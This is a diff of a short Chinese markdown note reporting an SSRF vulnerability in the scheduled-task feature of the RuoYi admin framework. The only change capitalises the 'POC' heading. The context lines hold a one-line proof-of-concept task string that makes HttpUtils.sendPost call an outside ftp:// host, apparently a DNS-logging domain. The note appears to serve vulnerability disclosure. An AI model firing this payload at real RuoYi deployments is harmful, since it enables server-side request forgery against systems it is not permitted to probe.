@@ -1,7 +1,7 @@
 ## 若依后台定时任务存在SSRF漏洞
 
 
-## poc
+## POC
 ```
 com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp://6a928e83f9.ipv6.1433.eu.org','')
 ```
